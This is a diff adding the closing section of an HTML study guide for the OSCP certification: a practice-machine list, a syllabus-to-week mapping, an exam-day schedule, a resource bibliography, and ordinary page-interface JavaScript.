+        <tr><td><strong>Linux Standalone, Web & SQLi</strong></td><td><code>hetemit</code>, <code>payday</code>, <code>uc404</code>, <code>butch</code>, <code>morbo</code>, <code>Nibbles</code>, <code>shifty</code>, <code>Nukem</code></td><td><code>reconstruction</code>, <code>xposedapi</code>, <code>Apex</code>, <code>hawat</code>, <code>pebbles</code>, <code>megavolt</code>, <code>Phobos</code>, <code>Twiggy</code>, <code>billyboss</code>, <code>escape</code>, <code>ClamAV</code>, <code>Pelican</code>, <code>Bratarina</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+  <a href="#toc" class="back-top">↑ Back to Contents</a>
+</div>
+
+<!-- CHAPTER 10 -->
+<div class="chapter" id="ch11">
+  <div class="chapter-label">Chapter 11</div>
+  <h2>Official OffSec PEN-200 Syllabus — Cross-Check</h2>
+  <div class="chapter-desc">Before you spend $1,649+ on the real PEN-200 course and exam bundle (Weeks 37–49), verify every officially listed module is already covered somewhere in your 49 weeks. Mapped below against OffSec's own published syllabus.</div>
+
+  <div class="callout info">
+    <span class="callout-title">Source</span>
+    This table paraphrases OffSec's own public PEN-200 syllabus (19 modules, offsec.com). Module wording is summarized in plain language, not copied verbatim.
+  </div>
+
+  <div class="table-wrap syllabus-map">
+    <div class="syllabus-row"><div class="sm-num">01</div><div><div class="sm-title">Introduction to CyberSecurity</div><div class="sm-desc">Foundational security concepts and terminology before any hands-on work.</div></div><div class="sm-week">Week 1–5</div></div>
+    <div class="syllabus-row"><div class="sm-num">02</div><div><div class="sm-title">Report Writing for Penetration Testers</div><div class="sm-desc">Structuring findings, evidence and remediation into a professional deliverable.</div></div><div class="sm-week">Week 13–14, 46–49</div></div>
+    <div class="syllabus-row"><div class="sm-num">03</div><div><div class="sm-title">Information Gathering</div><div class="sm-desc">Passive/active recon and target mapping with Nmap and similar tooling.</div></div><div class="sm-week">Week 13–14</div></div>
+    <div class="syllabus-row"><div class="sm-num">04</div><div><div class="sm-title">Vulnerability Scanning</div><div class="sm-desc">Scanner-driven vuln ID theory (Nessus/OpenVAS). <span class="sm-flag">Scanners banned on exam — theory only</span></div></div><div class="sm-week">Week 13–14</div></div>
+    <div class="syllabus-row"><div class="sm-num">05</div><div><div class="sm-title">Introduction to Web Applications</div><div class="sm-desc">HTTP fundamentals and common web architecture weak points.</div></div><div class="sm-week">Week 6, 15</div></div>
+    <div class="syllabus-row"><div class="sm-num">06</div><div><div class="sm-title">Common Web Application Attacks</div><div class="sm-desc">Traversal, LFI/RFI, upload bypass, command injection.</div></div><div class="sm-week">Week 16–17</div></div>
+    <div class="syllabus-row"><div class="sm-num">07</div><div><div class="sm-title">SQL Injection Attacks</div><div class="sm-desc">Manual database exploitation end to end. <span class="sm-flag">sqlmap banned — manual only</span></div></div><div class="sm-week">Week 18</div></div>
+    <div class="syllabus-row"><div class="sm-num">08</div><div><div class="sm-title">Client-Side Attacks</div><div class="sm-desc">Office macros, malicious file delivery, user-side exploitation.</div></div><div class="sm-week">Week 24</div></div>
+    <div class="syllabus-row"><div class="sm-num">09</div><div><div class="sm-title">Locating Public Exploits</div><div class="sm-desc">Searchsploit / Exploit-DB workflow and triage.</div></div><div class="sm-week">Week 19</div></div>
+    <div class="syllabus-row"><div class="sm-num">10</div><div><div class="sm-title">Fixing Exploits</div><div class="sm-desc">Adapting and cross-compiling broken public PoCs.</div></div><div class="sm-week">Week 19</div></div>
+    <div class="syllabus-row"><div class="sm-num">11</div><div><div class="sm-title">Antivirus Evasion</div><div class="sm-desc">Detection mechanics and basic payload obfuscation.</div></div><div class="sm-week">Week 24</div></div>
+    <div class="syllabus-row"><div class="sm-num">12</div><div><div class="sm-title">Password Attacks</div><div class="sm-desc">Spraying, brute force, offline hash cracking.</div></div><div class="sm-week">Week 19</div></div>
+    <div class="syllabus-row"><div class="sm-num">13</div><div><div class="sm-title">Windows Privilege Escalation</div><div class="sm-desc">Token abuse, service misconfig, stored creds.</div></div><div class="sm-week">Week 22–23</div></div>
+    <div class="syllabus-row"><div class="sm-num">14</div><div><div class="sm-title">Linux Privilege Escalation</div><div class="sm-desc">SUID/capabilities, cron, internal services.</div></div><div class="sm-week">Week 20–21</div></div>
+    <div class="syllabus-row"><div class="sm-num">15</div><div><div class="sm-title">Advanced Tunneling</div><div class="sm-desc">SSH tunnels, Ligolo-ng, multi-hop pivoting.</div></div><div class="sm-week">Week 25–26</div></div>
+    <div class="syllabus-row"><div class="sm-num">16</div><div><div class="sm-title">The Metasploit Framework</div><div class="sm-desc">Payloads, handlers, post-exploitation. <span class="sm-flag">1-machine limit on exam</span></div></div><div class="sm-week">Week 26</div></div>
+    <div class="syllabus-row"><div class="sm-num">17</div><div><div class="sm-title">Active Directory: Intro &amp; Enumeration</div><div class="sm-desc">Domain structure, BloodHound, trust/ACL mapping.</div></div><div class="sm-week">Week 27</div></div>
+    <div class="syllabus-row"><div class="sm-num">18</div><div><div class="sm-title">Attacking AD Authentication</div><div class="sm-desc">Kerberos, NTLM, spraying, roasting.</div></div><div class="sm-week">Week 28–29</div></div>
+    <div class="syllabus-row"><div class="sm-num">19</div><div><div class="sm-title">Lateral Movement in AD</div><div class="sm-desc">PtH, PtT, DCSync, domain-wide post-compromise.</div></div><div class="sm-week">Week 30</div></div>
+  </div>
+
+  <div class="callout success">
+    <span class="callout-title">Verdict</span>
+    All 19 official modules are already covered by Week 30 of your free plan. The paid window (Weeks 37–49) is repetition against official OffSec lab machines and mock exams, not new unseen material.
+  </div>
+</div>
+
+<div class="chapter" id="ch10">
+  <div class="chapter-label">Chapter 10</div>
+  <h2>Exam Day Playbook & Master Bibliography</h2>
+
+  <h3>10.1 Dynamic 24-Hour Exam Day Protocol</h3>
+  <p>Rather than following a rigid sleep clock that ignores how your exam is unfolding, use this flexible phase-based protocol:</p>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Phase</th><th>Target Window</th><th>Execution Protocol</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Phase 1: Triage & AD Launch</strong></td><td>Hour 0 – Hour 1</td><td>Complete proctor check-in, read all exam instructions, start background TCP/UDP Nmap scans on the 3 standalone hosts, and immediately begin enumerating the Active Directory set using your provided credentials.</td></tr>
+        <tr><td><strong>Phase 2: The 40-Point AD Push</strong></td><td>Hour 1 – Hour 9</td><td>Focus on the AD set first (MS01 → MS02 → DC). Time-box any roadblock to 90–120 minutes; if stuck on AD, pivot to a standalone box for 2 hours to secure points and let your subconscious process the AD hurdle.</td></tr>
+        <tr><td><strong>Phase 3: Standalone Rotation</strong></td><td>Hour 9 – Hour 18</td><td>Rotate across the 3 standalone boxes in 2-hour blocks. Aim for initial footholds (`local.txt`) and privesc (`proof.txt`) until you cross 70+ points.</td></tr>
+        <tr><td><strong>Flexible Rest Protocol</strong></td><td><em>Triggered by Progress or Fatigue</em></td><td>Take a 10-minute walk/hydration break every 2.5 hours. Take your main <strong>4–5 hour sleep block</strong> either (a) immediately after crossing 70 points so you wake up fresh to audit proofs, or (b) whenever you hit 2 consecutive 90-minute stalls without new progress.</td></tr>
+        <tr><td><strong>Phase 4: Proof & Screenshot Audit</strong></td><td>Final 2 Hours</td><td>Stop running new exploits. Verify every flag is entered in the control panel and verify every screenshot shows `whoami`, `ip a` / `ipconfig`, `hostname`, and the flag text in a single uncropped view.</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>10.2 Verified Master Bibliography</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Category</th><th>Resource Name</th><th>Verified URL</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Official Syllabus & Scope</strong></td><td>OffSec OSCP+ Body of Knowledge</td><td><code>https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge</code></td></tr>
+        <tr><td><strong>Official Study Schedules</strong></td><td>OffSec PEN-200 24-Week & 12-Week Learning Plans</td><td><code>https://help.offsec.com/hc/en-us/articles/15545672357780</code> (24-Wk)<br><code>https://help.offsec.com/hc/en-us/articles/15541765522196</code> (12-Wk)</td></tr>
+        <tr><td><strong>Official Exam Rules</strong></td><td>OffSec OSCP+ Exam Guide & FAQ</td><td><code>https://help.offsec.com</code></td></tr>
+        <tr><td><strong>Linux Foundations</strong></td><td>Linux Journey & OverTheWire Bandit</td><td><code>https://linuxjourney.com</code> · <code>https://overthewire.org/wargames/bandit/</code></td></tr>
+        <tr><td><strong>Networking</strong></td><td>Professor Messer CompTIA Network+ & Nmap Book</td><td><code>https://www.professormesser.com</code> · <code>https://nmap.org/book/</code></td></tr>
+        <tr><td><strong>Web Security & SQLi</strong></td><td>PortSwigger Web Security Academy (Free)</td><td><code>https://portswigger.net/web-security</code></td></tr>
+        <tr><td><strong>Metasploit</strong></td><td>OffSec Metasploit Unleashed (Free)</td><td><code>https://www.offsec.com/metasploit-unleashed/</code></td></tr>
+        <tr><td><strong>Privilege Escalation</strong></td><td>GTFOBins (Linux) & LOLBAS (Windows)</td><td><code>https://gtfobins.github.io</code> · <code>https://lolbas-project.github.io</code></td></tr>
+        <tr><td><strong>Active Directory</strong></td><td>The Hacker Recipes, WADComs, BadBlood & GOAD Lab</td><td><code>https://www.thehacker.recipes</code> · <code>https://wadcoms.github.io</code> · <code>https://github.com/davidprowe/BadBlood</code> · <code>https://github.com/Orange-Cyberdefense/GOAD</code></td></tr>
+        <tr><td><strong>Methodology & Writeups</strong></td><td>HackTricks, IppSec & 0xdf</td><td><code>https://book.hacktricks.wiki</code> · <code>https://www.youtube.com/@ippsec</code> · <code>https://0xdf.gitlab.io</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <a href="#top" class="back-top">↑ Return to Cover</a>
+</div>
+
+</div>
+
+</main>
+<button class="fab" id="fab" aria-label="Back to top">&uarr;</button>
+<script>
+(function(){
+  var sidebar=document.getElementById('sidebar'),backdrop=document.getElementById('backdrop'),burger=document.getElementById('burger');
+  function openSide(){sidebar.classList.add('open');backdrop.classList.add('show')}
+  function closeSide(){sidebar.classList.remove('open');backdrop.classList.remove('show')}
+  burger&&burger.addEventListener('click',function(){sidebar.classList.contains('open')?closeSide():openSide()});
+  backdrop&&backdrop.addEventListener('click',closeSide);
+  sidebar&&sidebar.addEventListener('click',function(e){if(e.target.closest('a'))closeSide()});
+
+  var links=[].slice.call(document.querySelectorAll('.side-link'));
+  var sections=links.map(function(l){return document.getElementById(l.getAttribute('href').slice(1))}).filter(Boolean);
+  function onScroll(){
+    var doc=document.documentElement;
+    var pct=(doc.scrollTop)/((doc.scrollHeight-doc.clientHeight)||1)*100;
+    var bar=document.getElementById('progress'); if(bar) bar.style.width=pct+'%';
+    var fab=document.getElementById('fab'); if(fab) fab.classList.toggle('show',doc.scrollTop>600);
+    var y=doc.scrollTop+120,active=null;
+    sections.forEach(function(s,i){ if(s.offsetTop<=y) active=i; });
+    links.forEach(function(l,i){ l.classList.toggle('active', i===active); });
+  }
+  document.addEventListener('scroll',onScroll,{passive:true}); onScroll();
+
+  var fab=document.getElementById('fab');
+  fab&&fab.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'})});
+
+  var input=document.getElementById('search');
+  var marks=[];
+  function clearMarks(){marks.forEach(function(m){var p=m.parentNode; p.replaceChild(document.createTextNode(m.textContent),m); p.normalize();}); marks=[];}
+  function doSearch(q){
+    clearMarks();
+    if(!q||q.length<2) return;
+    var nodes=document.querySelectorAll('.content h2,.content h3,.content h4,.content p,.content li,.content td');
+    var first=null; var re=new RegExp(q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),'ig');
+    nodes.forEach(function(n){
+      if(n.children.length && n.tagName!=='TD') return;
+      var t=n.textContent; if(!re.test(t)) return;
+      re.lastIndex=0;
+      var html=t.replace(re,function(m){return '<mark>'+m+'</mark>'});
+      if(html!==t){ n.innerHTML=html; marks=marks.concat([].slice.call(n.querySelectorAll('mark'))); if(!first) first=n; }
+    });
+    if(first) first.scrollIntoView({behavior:'smooth',block:'center'});
+  }
+  var t; input&&input.addEventListener('input',function(e){clearTimeout(t); var v=e.target.value; t=setTimeout(function(){doSearch(v)},250)});
+  input&&input.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault(); doSearch(e.target.value);}});
+
+  var themeBtn=document.getElementById('themeToggle');
+  function applyTheme(t){ document.documentElement.setAttribute('data-theme',t); try{localStorage.setItem('oscp-theme',t)}catch(e){} themeBtn.textContent = t==='light' ? '☾ Dark' : '☀ Light'; }
+  var saved; try{saved=localStorage.getItem('oscp-theme')}catch(e){}
+  applyTheme(saved||'dark');
+  themeBtn&&themeBtn.addEventListener('click',function(){
+    var cur=document.documentElement.getAttribute('data-theme');
+    applyTheme(cur==='light'?'dark':'light');
+  });
+})();
+
+(function(){
+  // scroll reveal
+  var els=[].slice.call(document.querySelectorAll('.chapter, .week-card, .toc-item, .cover-meta-item, .theory-box, .callout, .phase-banner, .table-wrap, .ref-box'));
+  els.forEach(function(e){e.classList.add('reveal')});
+  if('IntersectionObserver' in window){
+    var io=new IntersectionObserver(function(entries){
+      entries.forEach(function(en){ if(en.isIntersecting){ en.target.classList.add('in'); io.unobserve(en.target); } });
+    },{threshold:.08,rootMargin:'0px 0px -40px 0px'});
+    els.forEach(function(e){io.observe(e)});
+  } else { els.forEach(function(e){e.classList.add('in')}); }
+
+  // animated counters (cover-meta .num)
+  document.querySelectorAll('.cover-meta-item .num').forEach(function(n){
+    var txt=n.textContent.trim(); var m=txt.match(/^(\d+)(.*)$/);
+    if(!m) return;
+    var target=parseInt(m[1],10), suffix=m[2]||'';
+    n.textContent='0'+suffix;
+    var done=false;
+    var obs=new IntersectionObserver(function(entries){
+      entries.forEach(function(en){
+        if(en.isIntersecting && !done){
+          done=true; var start=null, dur=1100;
+          function step(ts){ if(!start) start=ts; var p=Math.min((ts-start)/dur,1);
+            n.textContent=Math.floor(p*target)+suffix;
+            if(p<1) requestAnimationFrame(step); else n.textContent=target+suffix;
+          }
+          requestAnimationFrame(step); obs.unobserve(n);
+        }
+      });
+    },{threshold:.5});
+    obs.observe(n);
+  });
+
+  // typed hero line
+  var typed=document.getElementById('typedLine');
+  if(typed){
+    var phrases=['root@kali:~# whoami','> 49 weeks. 10 chapters. one certification.','> enumerate. exploit. escalate. document.'];
+    var pi=0,ci=0,deleting=false;
+    function tick(){
+      var full=phrases[pi];
+      typed.textContent = deleting ? full.slice(0,ci--) : full.slice(0,ci++);
+      var delay = deleting ? 28 : 46;
+      if(!deleting && ci>full.length){ deleting=true; delay=1400; }
+      else if(deleting && ci<0){ deleting=false; pi=(pi+1)%phrases.length; ci=0; delay=400; }
+      setTimeout(tick,delay);
+    }
+    tick();
+  }
+
+  // matrix rain (hero only, light)
+  var canvas=document.getElementById('heroCanvas');
+  if(canvas && !window.matchMedia('(prefers-reduced-motion: reduce)').matches){
+    var ctx=canvas.getContext('2d');
+    function size(){ canvas.width=canvas.offsetWidth; canvas.height=canvas.offsetHeight; }
+    size(); window.addEventListener('resize',size);
+    var cols, drops, fontSize=14;
+    function init(){ cols=Math.floor(canvas.width/fontSize); drops=new Array(cols).fill(0); }
+    init();
+    var chars='01ABCDEF';
+    function draw(){
+      ctx.fillStyle='rgba(7,9,12,0.08)'; ctx.fillRect(0,0,canvas.width,canvas.height);
+      ctx.fillStyle='#39ff88'; ctx.font=fontSize+'px monospace';
+      for(var i=0;i<drops.length;i++){
+        var ch=chars[Math.floor(Math.random()*chars.length)];
+        ctx.fillText(ch, i*fontSize, drops[i]*fontSize);
+        if(drops[i]*fontSize>canvas.height && Math.random()>0.975) drops[i]=0;
+        drops[i]++;
+      }
+    }
+    setInterval(draw,55);
+  }
+})();
+
+</script>
+
+<script>(function(){document.addEventListener('keydown',function(e){if(e.key==='/'&&!/INPUT|TEXTAREA/.test(document.activeElement.tagName)){e.preventDefault();var s=document.getElementById('search');s&&s.focus();}});})();</script>
+
+</body>
+</html>
